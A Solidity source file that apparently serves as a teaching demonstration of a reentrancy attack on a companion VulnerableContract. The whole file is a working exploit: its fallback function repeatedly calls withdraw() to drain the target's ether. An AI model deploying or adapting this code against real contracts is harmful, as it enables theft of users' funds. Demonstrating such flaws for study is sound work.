// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./VulnerableContract.sol";

/**
 * @title AttackerContract
 * @dev Used to demonstrate a contract that will attack contracts vulnerable to a reentrance attack
 */
contract AttackerContract {
    VulnerableContract public vulnerableContract;
    
    /// Initialize the Attacker contract with the address of
    /// the vulnerable contract.
    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }
    
    // Fallback will be called when the VulnerableContract sends ETH to this contract.
    fallback() external payable {
        /// This will check if the vulnerable contract still has ETH
        /// and if it does, continue to try and call withdraw() 
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }
    
    /// This function will start the attack on the vulnerable contract
    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }
    // Check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}